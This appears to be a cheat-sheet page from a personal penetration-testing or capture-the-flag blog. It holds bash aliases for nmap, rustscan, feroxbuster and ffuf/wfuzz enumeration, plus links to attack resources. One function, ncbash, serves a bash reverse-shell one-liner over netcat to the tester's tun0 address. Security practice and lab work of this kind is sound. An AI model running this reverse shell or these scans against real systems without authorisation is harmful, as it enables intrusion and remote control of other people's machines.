---
layout: page
icon: fa-solid fa-list
title: Cheat Sheet
type: cheatsheet
---

## [File Transfer](https://nasrallahbaadi.com/posts/File-Transfer/)

## [Windows Passwords](https://nasrallahbaadi.com/posts/Windows-Passwords/)

## [Active Directory](https://nasrallahbaadi.com/cheatsheet/)

## [Pivoting & Tunneling](https://nasrallahbaadi.com/cheatsheet/)

##

## Aliases

```bash
alias www='sudo python3 -m http.server 80'
alias hosts='sudo vim /etc/hosts'
alias tun0cp="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"
alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n'"

nmapcv() {
    [ ! -d "./scans" ] && mkdir scans
    sudo nmap -sCV -T4 "${@}" | tee scans/nmap
}

nmapall() {
    [ ! -d "./scans" ] && mkdir scans
    sudo nmap --min-rate 1000 -p- -T4 "${@}" | tee scans/nmapall
}

rustall() {
    rustscan -r 0-65535 --ulimit 5000 $1 -t 9000 -- -sV -sC
}

ferobig () { 
    url="$1"; shift; feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://$url "$@" | tee scans/ferobig.txt
}

ferodir () { 
    url="$1"; shift; feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://$url "$@" | tee scans/ferodir.txt
}

ferocom () {
    url="$1"; shift; feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://$url "$@" | tee scans/ferocom.txt
}

ffufnames () {
    url="$1"; shift; ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://$url -H "Host: FUZZ.$url" "$@"
}

wfuzznames () {
    url="$1"; shift; wfuzz -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://$url -H "Host: FUZZ.$url" "$@"
}

ncbash () {
    echo "bash -i >& /dev/tcp/$(tun0)/9001 0>&1" | nc -lvnp 1234
}

```

## Resources

[0xdf](https://0xdf.gitlab.io/)

[HackTricks](https://book.hacktricks.xyz/)

[Ippsec.rocks](https://ippsec.rocks/)

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[RevShells](https://www.revshells.com/)
